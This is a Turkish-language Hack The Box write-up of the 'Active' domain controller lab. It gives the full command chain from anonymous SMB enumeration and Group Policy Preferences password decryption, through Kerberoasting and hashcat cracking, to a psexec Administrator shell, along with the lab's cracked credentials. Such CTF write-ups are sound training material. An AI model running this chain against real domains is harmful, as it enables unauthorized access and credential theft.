
# HTB – Active Writeup

## Target

* Machine: Active
* OS: Windows Server 2008 R2 (Domain Controller)
* Domain: active.htb

---

# 1. Nmap Scan

İlk olarak açık portları tespit ettik.

```
nmap -sC -sV -p- 10.129.16.164
```

Önemli servisler:

```
88   Kerberos
135  RPC
139  SMB
389  LDAP
445  SMB
464  Kerberos
593  RPC
636  LDAPS
3268 LDAP
```

Bu bize hedefin bir **Active Directory Domain Controller** olduğunu gösterir.

---

# 2. SMB Enumeration

Anonymous olarak SMB share'leri kontrol ettik.

```
smbclient -L //10.129.16.164 -N
```

Çıkan share'ler:

```
ADMIN$
C$
IPC$
NETLOGON
Replication
SYSVOL
Users
```

Dikkat çeken share:

```
Replication
```

---

# 3. Replication Share Enumeration

Replication share içine bağlandık.

```
smbclient //10.129.16.164/Replication -N
```

Klasörleri gezdik ve şu path'i bulduk:

```
Policies/{GUID}/Machine/Preferences/Groups/Groups.xml
```

Dosyayı indirdik.

```
get Groups.xml
```

---

# 4. Groups.xml Analizi

Dosya içinde şu satır bulundu:

```
cpassword="edBSHOwhZLTjt/QS9F..."
userName="active.htb\SVC_TGS"
```

`cpassword`, Group Policy Preferences içinde saklanan şifrelerdir.

Bu şifre **GPP encryption** ile saklanır ancak key public olduğu için decrypt edilebilir.

---

# 5. GPP Password Decryption

```
gpp-decrypt edBSHOwhZLTjt/QS9F...
```

Sonuç:

```
username: svc_tgs
password: GPPstillStandingStrong2k18
```

Artık domain içinde bir **service account credential** elde ettik.

---

# 6. Kerberoasting

Service account'lar genellikle **SPN (Service Principal Name)** içerir.

SPN içeren kullanıcılar Kerberoast edilebilir.

```
impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.129.16.164 -request
```

Çıktı:

```
$krb5tgs$23$...
```

Bu bir **Kerberos TGS hash**'idir.

---

# 7. Hash Cracking

Hash'i kırmak için Hashcat kullandık.

```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

Sonuç:

```
Administrator:Ticketmaster1968
```

---

# 8. Administrator Shell

Administrator hesabı ile uzaktan komut çalıştırdık.

```
psexec.py active.htb/Administrator:Ticketmaster1968@10.129.16.164
```

Shell elde edildi:

```
C:\Windows\system32>
```

---

# 9. Root Flag

```
type C:\Users\Administrator\Desktop\root.txt
```

---

# Attack Chain Summary

```
SMB Enumeration
↓
Replication Share
↓
Groups.xml
↓
cpassword
↓
GPP Decrypt
↓
Service Account Credential
↓
Kerberoasting
↓
Hash Cracking
↓
Administrator Access
```

---

# Lessons Learned

* SYSVOL / Replication share'leri her zaman kontrol edilmelidir.
* Group Policy Preferences credential leak içerebilir.
* Service account'lar Kerberoasting için ideal hedeflerdir.
* Kerberos hash'leri offline kırılabilir.
* Domain Admin erişimi genellikle credential reuse ile elde edilir.

---

# Useful Tools

```
smbclient
gpp-decrypt
impacket-GetUserSPNs
hashcat
psexec.py
```
